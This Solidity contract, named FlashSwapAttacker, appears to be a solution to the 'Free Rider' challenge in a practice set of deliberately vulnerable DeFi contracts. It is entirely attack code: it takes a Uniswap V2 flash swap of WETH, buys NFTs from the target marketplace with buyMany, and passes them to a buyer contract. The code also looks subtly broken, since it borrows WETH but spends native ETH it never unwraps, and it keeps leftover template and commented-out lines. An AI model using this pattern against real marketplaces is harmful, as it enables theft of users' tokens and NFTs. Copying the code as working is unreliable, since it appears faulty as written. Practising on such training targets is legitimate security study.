// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract FlashSwapAttacker is IUniswapV2Callee, IERC721Receiver {
    address private uniV2Factory;
    address payable private marketplace;
    address payable private buyerContract;

    address private DVT;
    address private WETH;

    IUniswapV2Factory private factory;

    IERC20 private weth;

    IUniswapV2Pair private immutable pair;
    IERC721 private immutable nft;

    // For this example, store the amount to repay
    uint public amountToRepay;
    uint256[] public tokenIds;

    constructor(uint256[] memory _tokenIds, address payable _buyerContract, address _nft, address payable _marketplace, address _uniV2Factory, address _dvt, address _weth) {
        tokenIds = _tokenIds;
        buyerContract = _buyerContract;
        nft = IERC721(_nft);
        marketplace = _marketplace;
        uniV2Factory = _uniV2Factory;
        factory = IUniswapV2Factory(_uniV2Factory);
        DVT = _dvt;
        WETH = _weth;
        weth = IERC20(_weth);
        pair = IUniswapV2Pair(factory.getPair(DVT, WETH));
    }

    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(WETH, msg.sender);

        // amount0Out is DVT, amount1Out is WETH
        pair.swap(0, wethAmount, address(this), data);
    }

    // This function is called by the DVT/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, address caller) = abi.decode(data, (address, address));

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == WETH, "token borrow != WETH");
        FreeRiderNFTMarketplace(marketplace).buyMany{value: amount1}(tokenIds);

        // about 0.3% fee, +1 to round up
        uint fee = (amount1 * 3) / 997 + 1;
        amountToRepay = amount1 + fee;

        // Transfer flash swap fee from caller
        weth.transferFrom(caller, address(this), fee);

        // Repay
        weth.transfer(address(pair), amountToRepay);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        // require(msg.sender == address(nft));
        // require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));

        nft.safeTransferFrom(address(this), buyerContract, _tokenId);
        
        // received++;
        // if(received == 6) {            
        //     payable(partner).sendValue(JOB_PAYOUT);
        // }            

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}
